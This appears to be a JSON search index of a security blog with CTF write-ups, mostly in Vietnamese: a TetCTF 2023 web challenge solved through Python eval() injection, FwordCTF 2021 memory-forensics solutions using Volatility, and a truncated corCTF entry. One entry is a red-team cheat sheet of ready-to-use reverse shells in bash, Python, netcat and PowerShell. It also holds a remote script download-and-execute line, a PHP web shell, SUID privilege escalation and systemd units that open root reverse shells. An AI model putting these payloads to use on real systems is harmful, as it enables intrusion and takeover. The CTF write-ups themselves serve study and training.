[ { "title": "[Writeup] TetCTF 2023 ", "url": "/posts/Writeup-TetCTF/", "categories": "Writeup, TetCTF2023", "tags": "writeup, web, ctf", "date": "2023-01-13 00:00:00 +0700", "snippet": "Trong bài này anh Tsu cho chúng ta một file code:Phân tích source code ta thấy bot sẽ querry theo các thông tin có sẵn trong các array và in ra theo điều kiện đầu vào. Để có được flag, ta cần phải ...", "content": "Trong bài này anh Tsu cho chúng ta một file code:Phân tích source code ta thấy bot sẽ querry theo các thông tin có sẵn trong các array và in ra theo điều kiện đầu vào. Để có được flag, ta cần phải làm thế nào để in ra được nội dung của biến Fl4G được lấy từ biến môi trường.Tổng quan sau khi review toàn bộ file source dynamic test chúng ta có hướng để khai thác bằng cách: Lợi dụng các array NewYear… đang được setup là biến global cùng với FL4G -&gt; ta có thể gọi biến này bằng tham số type khi thực hiện POST request. Vì code đang cho chạy debug nên khi ta truy cập web với url /?debug=Bu, ta có thế biết được chiều dài của FL4G. Lợi dụng else: greeting = eval(\"%s[%s]\" % (greetType, greetNumber)) để in ra vị trí của từng kí tự trong mảng, mà ở đây cụ thể là giá trị của từng vị trí trong mảng FL4G. Tuy nhiên, challenge này không dễ như vậy vì chúng ta có hàm (botValidator) sẽ kiểm tra giá trị number đầu vào, và so sánh với chiều dài tối đa của các array NewYear - 1, và chúng ta có 5. Như vậy với mảng FL4G bao gồm 24 kí tự, ta có thể gọi được phần tử 0, 1, 2, 3, 4, 5 và 24, 23, 22, 21 (-5, -4, -3, -2, -1).Vậy làm sao chúng ta có thể in ra được toàn bộ flag?Để ý rằng, trong code, hàm (botValidator) cần kiểm tra số, nhưng lại cho range kí tự được nhập là từ 0 - 57 và 124 - 255. Điều này giúp chúng ta có thể truyền vào những toán tử đặc biệt vì vị trí trong mảng có thể thực hiện phép toán.Tới đây thì ta chỉ việc tính toán và thực hiện phép tính sao cho tham số truyền vào sẽ không lớn 6 sau khi loại bỏ các kí tự.Để logic và có thể đọc được toàn bộ các vị trí thì mình đã dùng toán tử NOT ~Ta có:~0 = -1 =&gt; (~0+~0)*5 = -10 ~0+~5 = -7Cứ tiếp tục thục hiện các phép toán tương ứng với các vị trí còn thiếu ta sẽ có được flag.Peace!" }, { "title": "My note for quick to use", "url": "/posts/Quick-note/", "categories": "Note, OSCP, RedTeam", "tags": "", "date": "2021-09-26 00:00:00 +0700", "snippet": "My note for quick to use in HackTheBox, TryHackme, VulnBox,…Reverse shellBash$ bash -i &gt;&amp; /dev/tcp/10.0.0.1/9001 0&gt;&amp;1$ 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/9001; sh &lt;&am...", "content": "My note for quick to use in HackTheBox, TryHackme, VulnBox,…Reverse shellBash$ bash -i &gt;&amp; /dev/tcp/10.0.0.1/9001 0&gt;&amp;1$ 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.0.0.1/9001; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196$ /bin/bash -l &gt; /dev/tcp/10.0.0.1/9001 0&lt;&amp;1 2&gt;&amp;1Python$ export RHOST=\"10.0.0.1\";export RPORT=9001;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'$ python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",9001));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'Netcat$ nc -e /bin/sh 10.0.0.1 9001$ nc -e /bin/bash 10.0.0.1 9001$ nc -c bash 10.0.0.1 9001nc -e powershell 10.0.0.1 9001Powershellpowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')ls /usr/share/nishang/Shells/Create shell:https://www.revshells.com/RCEPHP&lt;?php system($_REQUEST['Command:']); ?&gt;Call shellPython$ python -c 'import pty; pty.spawn(\"/bin/bash\")'SETUIDCheck SETUID$ find / -user root -perm 4000 -print 2&gt;/dev/nullSETUIDchmod +s /bin/bash$ bash -psystemctl[Unit]Description=Run arbibtrary command as root[Service]Type=oneshotExecStart=id[Install]WantedBy=multi-user.target[Unit]Description=Black magic happening, avert your eyes[Service]RemainAfterExit=yesType=simpleExecStart=/bin/bash -c \"exec 5&lt;&gt;/dev/tcp/10.10.100.123/31337; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done\"[Install]WantedBy=default.target[Unit]Description=Root reverse shell[Service]Type=simpleUser=rootExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.1/9001 0&gt;&amp;1'[Install]WantedBy=multi-user.targetMake resondResponder$ responder -I eth0SMB server$ impacket-smbser -smb2support Bear $(pwd)" }, { "title": "[Writeup] FwordCTF 2021 - Forensics", "url": "/posts/Writeup-FwordCTF-2021-Forensics/", "categories": "Writeup, FwordCTF 2021", "tags": "forensics, writeup, FwordCTF", "date": "2021-08-29 00:00:00 +0700", "snippet": "listening?Chúng ta có đề bài là một file pcap. Sau khi nhìn tổng quan thì tất cả các package đều chỉ chung về việc truy cập OAUTH2 của google kèm theo đó là các biến client_secret; refresh_token;…R...", "content": "listening?Chúng ta có đề bài là một file pcap. Sau khi nhìn tổng quan thì tất cả các package đều chỉ chung về việc truy cập OAUTH2 của google kèm theo đó là các biến client_secret; refresh_token;…Response trả lỗi 403, yêu cầu SSL vì đây là truy vấn HTTP nên server không đáp ứng yêu cầu này.Mình thử với burpsuite để kiểm tra tính xác thực của các biến trên.Chú ý đến giá trị Scope: https://www.googleapis.com/auth/gmail.readonly. Điều này có nghĩa là các giá trị, token này sẽ cho phép chúng ta đọc được gmail thông qua API của google.Tìm kiếm trên Internet, mình có được tài liệu đầy đủ: https://developers.google.com/gmail/api/reference/rest và video hướng dẫn: https://www.youtube.com/watch?v=x7uG1-H0aDU.Sử dụng postman, set up môi trường theo video và có được flag:Flag: FwordCTF{email_forensics_is_interesting_73489nn7n4891}CryptDownload: Link 1; Link 2; Link 3Đề bài yêu cầu tìm 3 giá trị là ngày giờ nhận mail, người gửi và nội dung file đã bị mã hóa. Trước hết thì mình sử dụng volatility xem thử file dump này có thể có được thông tin từ các tiến trình đang chạy hay không.$python2 vol.py -f challenge.raw --profile=Win7SP1x64 pslistVolatility Foundation Volatility Framework 2.6.1Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0xfffffa8018d41890 System 4 0 76 492 ------ 0 2021-08-20 15:30:36 UTC+0000 0xfffffa8019506650 smss.exe 236 4 2 29 ------ 0 2021-08-20 15:30:36 UTC+0000 0xfffffa8019158060 csrss.exe 308 300 8 338 0 0 2021-08-20 15:30:42 UTC+0000 0xfffffa8018db9840 wininit.exe 356 300 3 76 0 0 2021-08-20 15:30:43 UTC+0000 0xfffffa8018dbe060 csrss.exe 364 348 10 222 1 0 2021-08-20 15:30:43 UTC+0000 0xfffffa801a179060 winlogon.exe 392 348 4 114 1 0 2021-08-20 15:30:43 UTC+0000 0xfffffa801a1b17c0 services.exe 452 356 7 183 0 0 2021-08-20 15:30:45 UTC+0000 0xfffffa801a1b97f0 lsass.exe 460 356 6 511 0 0 2021-08-20 15:30:45 UTC+0000 0xfffffa801a1c4b30 lsm.exe 468 356 10 138 0 0 2021-08-20 15:30:45 UTC+0000 0xfffffa801a234b30 svchost.exe 560 452 10 340 0 0 2021-08-20 15:30:49 UTC+0000 0xfffffa801a25db30 svchost.exe 624 452 6 239 0 0 2021-08-20 15:30:50 UTC+0000 0xfffffa801a29bb30 svchost.exe 724 452 20 443 0 0 2021-08-20 15:30:51 UTC+0000 0xfffffa801a2b3920 svchost.exe 768 452 19 417 0 0 2021-08-20 15:30:51 UTC+0000 0xfffffa801a2bb660 svchost.exe 792 452 32 908 0 0 2021-08-20 15:30:51 UTC+0000 0xfffffa801a2e1b30 audiodg.exe 884 724 5 125 0 0 2021-08-20 15:30:53 UTC+0000 0xfffffa801a30d890 svchost.exe 964 452 10 252 0 0 2021-08-20 15:30:55 UTC+0000 0xfffffa801a354b30 svchost.exe 284 452 13 346 0 0 2021-08-20 15:30:57 UTC+0000 0xfffffa801a3cb420 spoolsv.exe 1080 452 12 265 0 0 2021-08-20 15:31:01 UTC+0000 0xfffffa801a38bb30 svchost.exe 1112 452 18 313 0 0 2021-08-20 15:31:01 UTC+0000 0xfffffa801a44a340 armsvc.exe 1232 452 4 63 0 1 2021-08-20 15:31:03 UTC+0000 0xfffffa801a4b4350 svchost.exe 1292 452 11 173 0 0 2021-08-20 15:31:05 UTC+0000 0xfffffa80198b44e0 taskhost.exe 1784 452 9 174 1 0 2021-08-20 15:31:38 UTC+0000 0xfffffa801a5e8b30 dwm.exe 1856 768 3 70 1 0 2021-08-20 15:31:38 UTC+0000 0xfffffa801a5f7b30 explorer.exe 1884 1848 32 970 1 0 2021-08-20 15:31:39 UTC+0000 0xfffffa80192f9b30 StikyNot.exe 512 1884 9 138 1 0 2021-08-20 15:31:43 UTC+0000 0xfffffa801a677b30 SSScheduler.ex 832 1884 1 59 1 1 2021-08-20 15:31:44 UTC+0000 0xfffffa801a28a060 SearchIndexer. 1344 452 12 645 0 0 2021-08-20 15:31:46 UTC+0000 0xfffffa801a6cd910 SearchProtocol 1704 1344 6 310 0 0 2021-08-20 15:31:48 UTC+0000 0xfffffa8019160630 notepad.exe 596 440 1 64 1 0 2021-08-20 15:32:29 UTC+0000 0xfffffa8018e85b30 notepad.exe 1724 304 1 64 1 0 2021-08-20 15:32:58 UTC+0000 0xfffffa80198c5870 sppsvc.exe 1852 452 4 141 0 0 2021-08-20 15:33:09 UTC+0000 0xfffffa80198c5340 svchost.exe 304 452 13 317 0 0 2021-08-20 15:33:10 UTC+0000 0xfffffa8019935b30 notepad.exe 840 1800 1 64 1 0 2021-08-20 15:33:10 UTC+0000 0xfffffa801a17e060 notepad.exe 992 1780 1 64 1 0 2021-08-20 15:33:39 UTC+0000 0xfffffa801a333630 notepad.exe 2164 1884 1 60 1 0 2021-08-20 15:34:24 UTC+0000 0xfffffa801a6e0750 SearchFilterHo 2180 1344 4 85 0 0 2021-08-20 15:34:48 UTC+0000 0xfffffa801a351630 WmiPrvSE.exe 2308 560 7 116 0 0 2021-08-20 15:35:09 UTC+0000 0xfffffa801a3df610 DumpIt.exe 2512 1884 2 45 1 1 2021-08-20 15:35:16 UTC+0000 0xfffffa801a3e2840 conhost.exe 2536 364 2 53 1 0 2021-08-20 15:35:16 UTC+0000Để ý thì thấy rất nhiều tiến trình notepad.exe đang chạy. Chúng ta có thể dump memory của tiến trình để xem nội dung file mà notepad đang mở, tuy nhiên thì nó sẽ hơi noise và nhiều dữ liệu nên trước tiên thì mình dùng plugin cmdline để xem notepad đang mở những file nào và đường dẫn của những file này trên memory.$python2 vol.py -f challenge.raw --profile=Win7SP1x64 cmdlineVolatility Foundation Volatility Framework 2.6.1************************************************************************System pid: 4************************************************************************smss.exe pid: 236Command line : \\SystemRoot\\System32\\smss.exe************************************************************************csrss.exe pid: 308Command line : %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16************************************************************************wininit.exe pid: 356Command line : wininit.exe************************************************************************csrss.exe pid: 364Command line : %SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16************************************************************************winlogon.exe pid: 392Command line : winlogon.exe************************************************************************services.exe pid: 452Command line : C:\\Windows\\system32\\services.exe************************************************************************lsass.exe pid: 460Command line : C:\\Windows\\system32\\lsass.exe************************************************************************lsm.exe pid: 468Command line : C:\\Windows\\system32\\lsm.exe************************************************************************svchost.exe pid: 560Command line : C:\\Windows\\system32\\svchost.exe -k DcomLaunch************************************************************************svchost.exe pid: 624Command line : C:\\Windows\\system32\\svchost.exe -k RPCSS************************************************************************svchost.exe pid: 724Command line : C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted************************************************************************svchost.exe pid: 768Command line : C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted************************************************************************svchost.exe pid: 792Command line : C:\\Windows\\system32\\svchost.exe -k netsvcs************************************************************************audiodg.exe pid: 884Command line : C:\\Windows\\system32\\AUDIODG.EXE 0x2d8************************************************************************svchost.exe pid: 964Command line : C:\\Windows\\system32\\svchost.exe -k LocalService************************************************************************svchost.exe pid: 284Command line : C:\\Windows\\system32\\svchost.exe -k NetworkService************************************************************************spoolsv.exe pid: 1080Command line : C:\\Windows\\System32\\spoolsv.exe************************************************************************svchost.exe pid: 1112Command line : C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork************************************************************************armsvc.exe pid: 1232Command line : \"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\armsvc.exe\"************************************************************************svchost.exe pid: 1292Command line : C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation************************************************************************taskhost.exe pid: 1784Command line : \"taskhost.exe\"************************************************************************dwm.exe pid: 1856Command line : \"C:\\Windows\\system32\\Dwm.exe\"************************************************************************explorer.exe pid: 1884Command line : C:\\Windows\\Explorer.EXE************************************************************************StikyNot.exe pid: 512Command line : \"C:\\Windows\\System32\\StikyNot.exe\" ************************************************************************SSScheduler.ex pid: 832Command line : \"C:\\Program Files (x86)\\McAfee Security Scan\\3.11.1664\\SSScheduler.exe\" ************************************************************************SearchIndexer. pid: 1344Command line : C:\\Windows\\system32\\SearchIndexer.exe /Embedding************************************************************************SearchProtocol pid: 1704Command line : \"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe1_ Global\\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\" ************************************************************************notepad.exe pid: 596Command line : \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\SemahAB\\Downloads\\Secret content\\flag.txt.asc************************************************************************notepad.exe pid: 1724Command line : \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\SemahAB\\AppData\\Roaming\\Thunderbird\\Profiles\\gb1i6asd.default-release\\ImapMail\\imap.yandex.com\\INBOX************************************************************************sppsvc.exe pid: 1852Command line : C:\\Windows\\system32\\sppsvc.exe************************************************************************svchost.exe pid: 304Command line : C:\\Windows\\System32\\svchost.exe -k secsvcs************************************************************************notepad.exe pid: 840Command line : \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\SemahAB\\AppData\\Roaming\\Thunderbird\\Profiles\\gb1i6asd.default-release\\ImapMail\\imap.yandex.com\\Spam************************************************************************notepad.exe pid: 992Command line : \"C:\\Windows\\system32\\NOTEPAD.EXE\" C:\\Users\\SemahAB\\AppData\\Roaming\\Thunderbird\\Profiles\\gb1i6asd.default-release\\ImapMail\\imap.yandex.com\\Trash************************************************************************notepad.exe pid: 2164Command line : \"C:\\Windows\\system32\\notepad.exe\" ************************************************************************SearchFilterHo pid: 2180Command line : \"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 504 508 516 65536 512 ************************************************************************WmiPrvSE.exe pid: 2308Command line : C:\\Windows\\system32\\wbem\\wmiprvse.exe************************************************************************DumpIt.exe pid: 2512Command line : \"C:\\Users\\SemahAB\\Downloads\\DumpIt.exe\" ************************************************************************conhost.exe pid: 2536Command line : \\??\\C:\\Windows\\system32\\conhost.exeKhá nhiều thông tin hay ho, bao gồm nội dung inbox của email, spam, trash và cùng với đó là file flag.txt.asc, đây có thể là mảnh ghép đầu tiên trong flag. Dump file này cho mình kết quả:$python2 vol.py -f challenge.raw --profile=Win7SP1x64 filescan | grep \".txt.asc\"Volatility Foundation Volatility Framework 2.6.10x000000007fb5d2e0 16 0 R--rw- \\Device\\HarddiskVolume2\\Users\\SemahAB\\Downloads\\Secret content\\flag.txt.asc$python2 vol.py -f challenge.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007fb5d2e0 -D .$cat flag.txt.asc-----BEGIN PGP MESSAGE-----hQIMA6mGMG+kfeOaAQ/+K8a+2BQVT+Ixk6xJKytj0xbDUqfw7FUQuKLjWBcxddbnhd8eKmWIswUYpV3PmluCqJE5LRkdpX3Rdu/iK2ZRNyK7fGA3R3r3KFiBn5qKj0S4D47LqwDE/fpo5YUGt3GH6Cpujv3DrdIpXcn2yFZLBiho5415bcTn2D3qm/H6uz9NJFzved20D05OxTjj+a4s8Jsf7eroBj7DSIvvbD5/SF85rO1u1iQQHif2Na1CyrXXsJyAU59iVipWgjo1uoGfD8PqnhJdctnTbxu2oYY6MpnQ6K98WI6hwyo/crwUGJU1nQ8JKEQrirmcbZLsHb1fzmLDsEf2f0prG1QJXA3a9panz3N+TvIXvoWRXLkLgOcjKjK3NjZOlnsngcXNfaSIeZelskfCg096cUiEnfUeDDc8CaGFPO4uGnhnVo/bcEFMAuAiegy0/avdVIOU/Ho2o3ON6cQceYlsZD/Viy6oeNSib1Iyu3FLO1ZQMiaPZ6j3Ewrfag7mr5AOLM11WtYJRYtQh2oLV5hYsvxylxZOGdIJ05hDj/CdEcxYLQ0cv3xJxi4shl99rGgYL2NGALrL5pnjCBDBzAdIhKImlSZmurA+29/8iE5If+NJk86SQhNllhSF+jIrApsQkl0cTPoE+GPmA9QicMXeLXXB+iJjDG7MVOMX1aeJROmvGWTOxBTSswFiIgGBQQHE4cjQh8soViVMP7tOkraCYZRYGTxlrFJiCeI38gk7hx0n0hMnfMyylzzAKo8Fvt69q6smjOns0MhFVIfT4bUrb0md7KMXqn/OvtP/L/S9IEKjsMvk7yl6wrLYGYwBeIgfHqPIML0DxOuqV9WKWPoigazdRVW2hQqyEjqbJRG/GIyfaisMxNlTO+BIdWAsM3f7+gytkvmFo4lnR+Y7yVOL618HSBhie2SFwGNu=YEJl-----END PGP MESSAGE-----Mình cũng không bất ngờ nhiều khi nội dung file đã bị mã hóa vì theo đề bài thì chúng ta cần tìm cách decrypt thông qua mail mà user gửi và nhận. Tiếp tục dump các file INBOX, SPAM, TRASH.IBOX: Trong phần này mình chú ý đến email của ctf.user. Chúng ta có đoạn base64 dài cần decode. Kết quả thu được là file key để giải mã PGP. Nhưng khi mình import thì lại cần passphrase để mở key. Tiếp tục đi tìm nào.TRASH: Mình hy vọng là user sẽ xóa mail chứa passphrase, tuy nhiên thì file này lại không cho chúng ta thông tin gì.SPAM: Cho mình một chi tiết rất quan trọng: But we used the same secret as your EN VAR 345YACCESSTOGENERATEP455. Mình đã thử rất nhiều lần 345YACCESSTOGENERATEP455 là passphrase nhưng không thành công và khác là stuck. Thì một người em của mình đã tìm ra vì envars là một trong những plugin của volatility.$python2 vol.py -f challenge.raw --profile=Win7SP1x64 envars | grep 345YACCESSTOGENERATEP455Volatility Foundation Volatility Framework 2.6.1 308 csrss.exe 0x00000000003a1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 356 wininit.exe 0x000000000043a990 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 364 csrss.exe 0x0000000000181320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 392 winlogon.exe 0x000000000007e060 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 452 services.exe 0x0000000000341320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 460 lsass.exe 0x0000000000351320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 468 lsm.exe 0x0000000000231320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 560 svchost.exe 0x00000000001e1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 624 svchost.exe 0x0000000000311320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 724 svchost.exe 0x00000000001e1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 768 svchost.exe 0x0000000000171320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 792 svchost.exe 0x0000000000301320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 964 svchost.exe 0x0000000000351320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 284 svchost.exe 0x00000000001e1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1080 spoolsv.exe 0x0000000000161320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1112 svchost.exe 0x0000000000361320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1232 armsvc.exe 0x0000000000151320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1292 svchost.exe 0x0000000000371320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1784 taskhost.exe 0x00000000001c1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1856 dwm.exe 0x0000000000071320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1884 explorer.exe 0x00000000037cd6b0 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 512 StikyNot.exe 0x00000000003d1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 832 SSScheduler.ex 0x0000000000501320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1344 SearchIndexer. 0x000000000040a010 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1704 SearchProtocol 0x00000000001f1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 596 notepad.exe 0x00000000002b1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1724 notepad.exe 0x0000000000171320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 1852 sppsvc.exe 0x0000000000271320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 304 svchost.exe 0x000000000021d0e0 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 840 notepad.exe 0x0000000000361320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 992 notepad.exe 0x0000000000221320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 2164 notepad.exe 0x0000000000301320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 2180 SearchFilterHo 0x00000000002a1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 2308 WmiPrvSE.exe 0x00000000003d1320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 2512 DumpIt.exe 0x0000000000081320 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533 2536 conhost.exe 0x00000000003ad7f0 345YACCESSTOGENERATEP455 pPaAsSpPhHrR445533Decrypt thôi nào$gpg --import b64.key$gpg -o flag --decrypt flag.txt.ascgpg: encrypted with 4096-bit RSA key, ID A986306FA47DE39A, created 2021-08-20 \"SemahBA (Not too far to get what you want) &lt;SemahBA@fword.tech&gt;\"$cat flagWe are so proud that we sent you to give him back his important file. The important thing was : 23b2e901f3c3c3827a70589efd046be8OK flag đã gần hoàn thiện, chỉ còn thời gian gửi, mình có thử 1, 2 lần vì time from và date ở INBOX khác nhau và ra được flag hoàn thiện.Flag: FwordCTF{08202021-05:03_ctf.user_23b2e901f3c3c3827a70589efd046be8}eLearningDownload: Link 1; Link 2; Link 3Đề bài ta một file ảnh nên mình dùng Autospy để trích xuất dữ liệu.Sau khi để ý ở Program Files có ứng dụng Mailbird, mình google ra được đường dẫn lưu trữ là \\Users\\fword\\AppData\\Local\\Mailbird\\Store. Ở đây chúng ta xuất ra được file lưu trữ email là Store.db, sử DB Browser, mình có được thông tin:Vậy là đã có được thông tin của giảng viên. Phần còn lại mình đã kiếm log của dirsearch và zenmap nhưng không cho thêm kết quả gì. Thử sử dụng lịch sử powershell: %APPDATA%\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt ta thu được:New-Item -ItemType Diretory -Path C:\\users\\fword\\lab01New-Item -ItemType Directory -Path C:\\users\\fword\\lab01lscd .\\lab01\\nmap -sC -sV 192.168.1.9cd ..\\Downloads\\dirsearch-master\\dirsearch-master\\echo \"192.168.1.9 lab01.fword\" &gt;&gt; C:\\Windows\\System32\\drivers\\etc\\hostslspython .\\dirsearch.py -u http://lab01.fword -e txt,php cdcd Ccd C:\\cdcd Ccd C:\\cdcd Ccd C:\\cdcd Ccd C:\\cdcd Ccd C:\\cdcd Ccd C:\\cdcd Ccd C:\\Users\\fword\\wget http://lab01.fword/secret/secret.txtRename-Item -Path \"c:\\Users\\fword\\secret.txt\" -NewName \"file.txt\"Vậy là có thêm các tools đã dùng: dirsearch-nmap-wget. Tiếp theo ta đọc file.txt ở thử mục Document: 663cd2dfc9418f384d90c89a15319b3dFlag: FwordCTF{SBA_192.168.1.9_dirsearch-nmap-wget_secret.txt_663cd2dfc9418f384d90c89a15319b3d}shshshLại là một thử thách về memory forensics.Tuy nhiên thử thách này lại không có bất kì process hay thông tin gì khả nghi. Nên mình thử kiểm tra biến môi trường.$ python vol.py -f chall.vmem --profile=WinXPSP2x86 envars....1552 explorer.exe 0x00010000 k1 12a45652a154a358452124565487ad01552 explorer.exe 0x00010000 iv k11552 explorer.exe 0x00010000 KT AES128-CBC1552 explorer.exe 0x00010000 LOGONSERVER \\\\CTFCREATORS-DF....Chúng ta có key và iv của thuật toán mã hóa AES128-CBC; tuy nhiên lại không có tệp mã hóa.Đoạn này thì mình cũng mò mãi đến lúc sau thì mới thấy bỏ xót 1 phần quan trọng trong các biến môi trường:1552 explorer.exe 0x00010000 PATHEXT .HAK;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;Chỉ duy nhất PATHEXT của explorer là có đuôi mở rộng rất lạ là .HAK; thử tìm xem có bao nhiêu file .HAK nào.$ python vol.py -f chall.vmem --profile=WinXPSP2x86 filescan | grep -i \".HAK\"Volatility Foundation Volatility Framework 2.6.10x00000000012403d8 1 0 -W-rw- \\Device\\HarddiskVolume1\\WINDOWS\\system32\\Handles.HAK0x000000000198c0d0 2 2 R--rw- \\Device\\HarddiskVolume1\\WINDOWS\\system32\\Handles.HAK$ python vol.py -f chall.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x00000000012403d8 -D .$ strings file.None.0x8144e990.dat NDgwYjJmMzM4ZjY0N2M3ZTY1MjQwZTc2MjdjYWRhYmFjNWJkNWZjNjllNWQxZDMzM2ZlYjRlMjNjYzNhYjA5NGZlY2E1ODcxMjA5ODJmODExM2U0NTMzNjcxOThmMDU4MWJlZDNhZWMxNTBkMjg1NDIzYWUxMTFiN2I5NDkzNjExZmFjMmNmYmViYjg5NzkzY2U3MThjM2YxZTJkNWNlMjcwMmE5MWNjNDM4NzZhYjJmZGJjZjc0MmRlODg4M2Q2OTIzYjAwYTYyNTMzMGRhOWRiNjljNmFiYmU0ZjIxY2Y5NGJiZmMxMWU2MWJkZDc0NmVjNDU5OGRkNTQ2ZDk2YQo=Decrypt thôi nào Flag: FwordCTF{y0u_CAN_Mak3_u5e_of_4ny_proCesS_with_tHe_ri9ht_apProach}Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)" }, { "title": "[Writeup] corCTF 2021", "url": "/posts/Writeup-corCTF-2021/", "categories": "Writeup, corCTF 2021", "tags": "cryptography, writeup, corCTF", "date": "2021-08-23 00:00:00 +0700", "snippet": "fibinaryBài này chúng ta có source code encrypt:fib = [1, 1]for i in range(2, 